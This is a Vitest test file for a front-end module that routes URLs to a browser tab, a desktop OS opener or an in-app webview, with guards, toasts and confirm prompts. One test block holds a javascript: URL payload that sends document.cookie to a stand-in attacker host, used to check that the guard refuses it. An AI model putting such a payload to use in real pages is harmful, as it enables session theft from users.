import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { confirmState, panelOverlay, preferences, webviewInitialUrl, toasts } from '../store';

const pushNavState = vi.fn();
vi.mock('./navigation', () => ({ pushNavState }));
const revealContentPane = vi.fn();
vi.mock('./pane', () => ({ revealContentPane }));

const platformMocks = vi.hoisted(() => ({ isTauri: false, isIOSPwa: false }));
vi.mock('../../utils/platform', () => ({
  isTauri: () => platformMocks.isTauri,
  isIOS: () => false,
  isIOSPwa: () => platformMocks.isIOSPwa,
}));

const openExternal = vi.hoisted(() => vi.fn(() => Promise.resolve()));
vi.mock('../../utils/tauri', () => ({
  openExternal,
  setTitlebarColor: () => Promise.resolve(),
  windowReadyToShow: () => {},
}));

const postClientLog = vi.hoisted(() => vi.fn());
vi.mock('../../utils/clientLog', () => ({ postClientLog }));

const { openUrl, openUrlOutsideApp, openLocalFileOnConfirm } = await import('./artifacts');

const windowOpen = vi.hoisted(() => vi.fn());
function fakeWindow(): { closed: boolean; opener: unknown } {
  return { closed: false, opener: {} };
}

const TARGET_URL = 'https://example.com/';
const APP_URL = 'https://app.example.com/ws/dev/';
let fakeLocation: { href: string };

describe('openUrl / openUrlOutsideApp: system browser vs in-app webview routing', () => {
  beforeEach(() => {
    panelOverlay.value = null;
    webviewInitialUrl.value = null;
    preferences.value = { status: 'loaded', data: {} };
    platformMocks.isTauri = false;
    platformMocks.isIOSPwa = false;
    pushNavState.mockClear();
    revealContentPane.mockClear();
    openExternal.mockClear();
    windowOpen.mockReset();
    windowOpen.mockReturnValue(fakeWindow());
    postClientLog.mockClear();
    toasts.value = [];
    fakeLocation = { href: APP_URL };
    vi.stubGlobal('open', windowOpen);
    vi.stubGlobal('location', fakeLocation);
  });

  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it('non-Tauri (web/PWA): opens a new tab, never the in-app panel or the OS opener', () => {
    platformMocks.isTauri = false;
    openUrl(TARGET_URL);

    expect(window.open).toHaveBeenCalledWith(TARGET_URL, '_blank');
    expect(openExternal).not.toHaveBeenCalled();
    expect(panelOverlay.value).toBeNull();
    expect(window.location.href).toBe(APP_URL);
    expect(toasts.value).toEqual([]);
  });

  it('non-Tauri, popup blocked: the whole chain surfaces it instead of going silent', () => {
    platformMocks.isTauri = false;
    windowOpen.mockReturnValue(null);

    openUrl(TARGET_URL);

    expect(toasts.value).toHaveLength(1);
    expect(toasts.value[0].message).toContain(TARGET_URL);
    expect(toasts.value[0].action?.label).toBe('Open');
    expect(postClientLog).toHaveBeenCalledWith('nav', 'external-url-blocked', {
      url: TARGET_URL,
      source: null,
    });
  });

  it('non-Tauri, popup blocked: the toast names the thread that asked', () => {
    platformMocks.isTauri = false;
    windowOpen.mockReturnValue(null);

    openUrl(TARGET_URL, 'thread "Weekly report"');

    expect(toasts.value[0].message).toContain('(requested by thread "Weekly report")');
  });

  it('installed iOS PWA: hands the URL to Safari, never the inescapable in-app web view', () => {
    platformMocks.isTauri = false;
    platformMocks.isIOSPwa = true;

    openUrl(TARGET_URL);

    expect(window.location.href).toBe(`x-safari-${TARGET_URL}`);
    expect(window.open).not.toHaveBeenCalled();
    expect(openExternal).not.toHaveBeenCalled();
    expect(panelOverlay.value).toBeNull();
  });

  it('Tauri + toggle off (default): opens the system browser, never the in-app panel', () => {
    platformMocks.isTauri = true;
    preferences.value = { status: 'loaded', data: {} };

    openUrl(TARGET_URL);

    expect(openExternal).toHaveBeenCalledWith(TARGET_URL);
    expect(panelOverlay.value).toBeNull();
    expect(window.open).not.toHaveBeenCalled();
    expect(pushNavState).not.toHaveBeenCalled();
    expect(window.location.href).toBe(APP_URL);
  });

  it('openUrlOutsideApp, Tauri + toggle off: lowercases the scheme and host before the OS opener gets it', () => {
    platformMocks.isTauri = true;
    preferences.value = { status: 'loaded', data: {} };

    openUrlOutsideApp('HTTPS://EXAMPLE.com');

    expect(openExternal).toHaveBeenCalledWith('https://example.com/');
  });

  it('Tauri + toggle on: opens the in-app webview panel, never the system browser', () => {
    platformMocks.isTauri = true;
    preferences.value = { status: 'loaded', data: { experimental_in_app_browser: 'true' } };

    openUrl(TARGET_URL);

    expect(panelOverlay.value).toEqual({ type: 'url-preview', url: TARGET_URL });
    expect(webviewInitialUrl.value).toBe(TARGET_URL);
    expect(revealContentPane).toHaveBeenCalledTimes(1);
    expect(pushNavState).toHaveBeenCalledTimes(1);
    expect(openExternal).not.toHaveBeenCalled();
    expect(window.location.href).toBe(APP_URL);
  });

  it('openUrlOutsideApp, Tauri + toggle ON: the OS opener, and no panel', () => {
    platformMocks.isTauri = true;
    preferences.value = { status: 'loaded', data: { experimental_in_app_browser: 'true' } };

    openUrlOutsideApp(TARGET_URL);

    expect(openExternal).toHaveBeenCalledWith(TARGET_URL);
    expect(panelOverlay.value).toBeNull();
    expect(webviewInitialUrl.value).toBeNull();
    expect(pushNavState).not.toHaveBeenCalled();
    expect(window.open).not.toHaveBeenCalled();
  });

  it('openUrlOutsideApp, non-Tauri: a new tab, never the OS opener', () => {
    platformMocks.isTauri = false;

    openUrlOutsideApp(TARGET_URL);

    expect(window.open).toHaveBeenCalledWith(TARGET_URL, '_blank');
    expect(openExternal).not.toHaveBeenCalled();
    expect(panelOverlay.value).toBeNull();
  });

  it('openUrlOutsideApp, non-Tauri + popup blocked: the toast names the source', () => {
    platformMocks.isTauri = false;
    windowOpen.mockReturnValue(null);

    openUrlOutsideApp(TARGET_URL, 'thread "Weekly report"');

    expect(toasts.value[0].message).toContain('(requested by thread "Weekly report")');
  });

  describe('a scripted scheme reaches none of the three sinks', () => {
    const SCRIPTED = 'javascript:fetch("https://evil.test/"+document.cookie)';

    it('non-Tauri: no tab, and the refusal is visible', () => {
      platformMocks.isTauri = false;

      openUrl(SCRIPTED);

      expect(window.open).not.toHaveBeenCalled();
      expect(window.location.href).toBe(APP_URL);
      expect(toasts.value).toHaveLength(1);
      expect(toasts.value[0].message).toContain('Refused to open a scripted url');
    });

    it('Tauri + toggle off: never reaches the OS opener', () => {
      platformMocks.isTauri = true;
      preferences.value = { status: 'loaded', data: {} };

      openUrl(SCRIPTED);

      expect(openExternal).not.toHaveBeenCalled();
      expect(panelOverlay.value).toBeNull();
    });

    it('Tauri + toggle on: never reaches the in-app webview', () => {
      platformMocks.isTauri = true;
      preferences.value = { status: 'loaded', data: { experimental_in_app_browser: 'true' } };

      openUrl(SCRIPTED);

      expect(panelOverlay.value).toBeNull();
      expect(webviewInitialUrl.value).toBeNull();
      expect(pushNavState).not.toHaveBeenCalled();
      expect(revealContentPane).not.toHaveBeenCalled();
    });

    it('openUrlOutsideApp is guarded too, since OAuth calls it directly', () => {
      platformMocks.isTauri = true;
      preferences.value = { status: 'loaded', data: { experimental_in_app_browser: 'true' } };

      openUrlOutsideApp(SCRIPTED, 'thread "Read my email"');

      expect(openExternal).not.toHaveBeenCalled();
      expect(window.open).not.toHaveBeenCalled();
      expect(toasts.value[0].message).toContain('(requested by thread "Read my email")');
    });

    it('an ordinary https url still opens, so the guard is not a blanket refusal', () => {
      platformMocks.isTauri = false;

      openUrl(TARGET_URL);

      expect(window.open).toHaveBeenCalledWith(TARGET_URL, '_blank');
      expect(toasts.value).toEqual([]);
    });
  });

  describe('asks before handing a local file to the OS opener', () => {
    const LOCAL = 'file:///Applications/Terminal.app';

    beforeEach(() => {
      confirmState.value = { visible: false, message: '', okLabel: 'Delete' };
    });

    it('a navigate from an app waits for the confirm, and opens only on yes', async () => {
      platformMocks.isTauri = true;

      openUrl(LOCAL, 'an app');

      expect(openExternal).not.toHaveBeenCalled();
      expect(confirmState.value.visible).toBe(true);
      expect(confirmState.value.message).toContain(LOCAL);
      expect(confirmState.value.message).toContain('an app');
      confirmState.value.resolve?.(true);
      await vi.waitFor(() => expect(openExternal).toHaveBeenCalledWith(LOCAL));
    });

    it('a declined confirm opens nothing', async () => {
      platformMocks.isTauri = true;

      openUrlOutsideApp('/Applications/Terminal.app', 'thread "Book a flight"');
      confirmState.value.resolve?.(false);
      await Promise.resolve();
      await Promise.resolve();

      expect(openExternal).not.toHaveBeenCalled();
    });

    it('a content link to a local file asks too', async () => {
      platformMocks.isTauri = true;

      void openLocalFileOnConfirm(LOCAL, 'artifacts/reports/q3.html');

      expect(confirmState.value.message).toContain('artifacts/reports/q3.html');
      expect(openExternal).not.toHaveBeenCalled();
    });

    it.each([
      '/Users/me/Downloads/Lucidos.dmg',
      'file:///Users/me/Downloads/Lucidos.dmg',
    ])('a browser says it cannot open %s, and navigates nowhere', (target) => {
      platformMocks.isTauri = false;

      void openLocalFileOnConfirm(target, 'thread "Release"');

      expect(window.open).not.toHaveBeenCalled();
      expect(window.location.href).toBe(APP_URL);
      expect(confirmState.value.visible).toBe(false);
      expect(toasts.value).toHaveLength(1);
      expect(toasts.value[0].type).toBe('error');
      expect(toasts.value[0].message).toContain(target);
      expect(toasts.value[0].message).toContain('(requested by thread "Release")');
    });

    it('a browser still opens a protocol-relative url in a tab', () => {
      platformMocks.isTauri = false;

      void openLocalFileOnConfirm('//example.com/page');

      expect(window.open).toHaveBeenCalledWith(
        expect.stringMatching(/^https?:\/\/example\.com\/page$/),
        expect.anything(),
      );
      expect(toasts.value).toEqual([]);
    });

    it('Tauri + toggle ON: a local file asks for the OS opener, never the panel', async () => {
      platformMocks.isTauri = true;
      preferences.value = { status: 'loaded', data: { experimental_in_app_browser: 'true' } };

      openUrl(LOCAL, 'an app');

      expect(panelOverlay.value).toBeNull();
      expect(webviewInitialUrl.value).toBeNull();
      expect(pushNavState).not.toHaveBeenCalled();
      expect(confirmState.value.visible).toBe(true);
      confirmState.value.resolve?.(true);
      await vi.waitFor(() => expect(openExternal).toHaveBeenCalledWith(LOCAL));
    });

    it.each([
      'data:text/html,hello',
      'x-custom-app://open',
      'mailto:someone@example.com',
    ])('Tauri + toggle ON: %s never mounts the panel', (target) => {
      platformMocks.isTauri = true;
      preferences.value = { status: 'loaded', data: { experimental_in_app_browser: 'true' } };

      openUrl(target, 'an app');

      expect(panelOverlay.value).toBeNull();
      expect(webviewInitialUrl.value).toBeNull();
      expect(revealContentPane).not.toHaveBeenCalled();
    });

    it('a web url still opens at once, with no confirm', () => {
      platformMocks.isTauri = true;

      openUrlOutsideApp(TARGET_URL, 'an app');

      expect(openExternal).toHaveBeenCalledWith(TARGET_URL);
      expect(confirmState.value.visible).toBe(false);
    });
  });
});
